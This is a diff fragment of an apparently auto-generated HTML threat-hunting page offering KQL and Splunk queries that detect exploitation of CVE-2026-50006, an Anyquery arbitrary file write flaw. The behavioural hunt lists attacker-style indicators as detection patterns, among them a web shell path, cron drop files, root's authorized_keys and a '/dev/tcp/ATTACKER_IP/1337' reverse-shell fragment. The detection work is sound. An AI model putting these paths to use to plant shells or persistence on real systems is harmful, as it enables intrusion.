+| where Timestamp &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-50006&quot;)
+| join kind=inner (DeviceInfo | where Timestamp &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-241-uc5-sentinel"><pre><button class="copy-btn">COPY</button><code>// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
+// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
+// no Sentinel translation — track via Update / Heartbeat OS-version
+// gaps as a coarse approximation.
+DeviceTvmSoftwareVulnerabilities
+| where TimeGenerated &gt; ago(1d)
+| where CveId in~ (&quot;CVE-2026-50006&quot;)
+| join kind=inner (DeviceInfo | where TimeGenerated &gt; ago(1d)) on DeviceId
+| project DeviceName, OSPlatform, CveId,
+          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
+| order by VulnerabilitySeverityLevel asc, DeviceName asc
+</code></pre></div>
+    <div class="tab-content" id="art-241-uc5-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc5-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc5-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc5-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-50006&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre><pre class="spl-mode-body" id="art-241-uc5-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
+    from datamodel=Vulnerabilities
+    where Vulnerabilities.signature IN (&quot;CVE-2026-50006&quot;)
+    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
+| `drop_dm_object_name(Vulnerabilities)`
+| sort - severity</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="80c2c6c1cc" data-platforms="def,sent,spl" data-targets="linux,windows">
+  <summary>
+    <span class="uc-title">Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou</span>
+    <span class="uc-phase">Installation</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="80c2c6c1cc" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="User Execution: Malicious File">T1204.002</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">Endpoint.Filesystem</span> <span class="ind">Endpoint.Registry</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc6-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-241-uc6-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc6-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc6-kql"><pre><button class="copy-btn">COPY</button><code>// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou
+// Hunts the actual binaries / paths / commandline fragments named
+// in the article instead of a generic technique-class template.
+
+// File-creation events for the named binaries / paths
+DeviceFileEvents
+| where Timestamp &gt; ago(30d)
+| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
+| where (FolderPath has_any (&quot;/var/www/html/shell.php&quot;, &quot;/etc/cron.d/pwn&quot;, &quot;/root/.ssh/authorized_keys&quot;, &quot;/etc/cron.d&quot;, &quot;/var/spool/cron/crontabs/&quot;, &quot;/dev/tcp/ATTACKER_IP/1337&quot;, &quot;/tmp/pwn.db&quot;))
+| project Timestamp, DeviceName, AccountName, FolderPath,
+          FileName, ActionType, InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc6-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
+// Requires the Microsoft 365 Defender data connector (streams the
+// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
+// Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou
+// Hunts the actual binaries / paths / commandline fragments named
+// in the article instead of a generic technique-class template.
+
+// File-creation events for the named binaries / paths
+DeviceFileEvents
+| where TimeGenerated &gt; ago(30d)
+| where ActionType in (&quot;FileCreated&quot;,&quot;FileModified&quot;)
+| where (FolderPath has_any (&quot;/var/www/html/shell.php&quot;, &quot;/etc/cron.d/pwn&quot;, &quot;/root/.ssh/authorized_keys&quot;, &quot;/etc/cron.d&quot;, &quot;/var/spool/cron/crontabs/&quot;, &quot;/dev/tcp/ATTACKER_IP/1337&quot;, &quot;/tmp/pwn.db&quot;))
+| project TimeGenerated, DeviceName, AccountName, FolderPath,
+          FileName, ActionType, InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc6-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc6-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc6-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc6-spl-acc"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou ```
+| tstats `summariesonly` count
+    from datamodel=Endpoint.Filesystem
+    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
+      AND (Filesystem.file_path=&quot;*/var/www/html/shell.php*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d/pwn*&quot; OR Filesystem.file_path=&quot;*/root/.ssh/authorized_keys*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d*&quot; OR Filesystem.file_path=&quot;*/var/spool/cron/crontabs/*&quot; OR Filesystem.file_path=&quot;*/dev/tcp/ATTACKER_IP/1337*&quot; OR Filesystem.file_path=&quot;*/tmp/pwn.db*&quot;)
+    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
+       Filesystem.file_path, Filesystem.file_name
+| `drop_dm_object_name(Filesystem)`</code></pre><pre class="spl-mode-body" id="art-241-uc6-spl-raw"><button class="copy-btn">COPY</button><code>``` Article-specific bespoke detection — [GHSA / CRITICAL] CVE-2026-50006: Anyquery: Arbitrary File Write (AFW) which cou ```
+| tstats summariesonly=false count
+    from datamodel=Endpoint.Filesystem
+    where Filesystem.action IN (&quot;created&quot;,&quot;modified&quot;)
+      AND (Filesystem.file_path=&quot;*/var/www/html/shell.php*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d/pwn*&quot; OR Filesystem.file_path=&quot;*/root/.ssh/authorized_keys*&quot; OR Filesystem.file_path=&quot;*/etc/cron.d*&quot; OR Filesystem.file_path=&quot;*/var/spool/cron/crontabs/*&quot; OR Filesystem.file_path=&quot;*/dev/tcp/ATTACKER_IP/1337*&quot; OR Filesystem.file_path=&quot;*/tmp/pwn.db*&quot;)
+    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
+       Filesystem.file_path, Filesystem.file_name
+| `drop_dm_object_name(Filesystem)`</code></pre></div></div>
   </div>
 </details></div>
 </article>
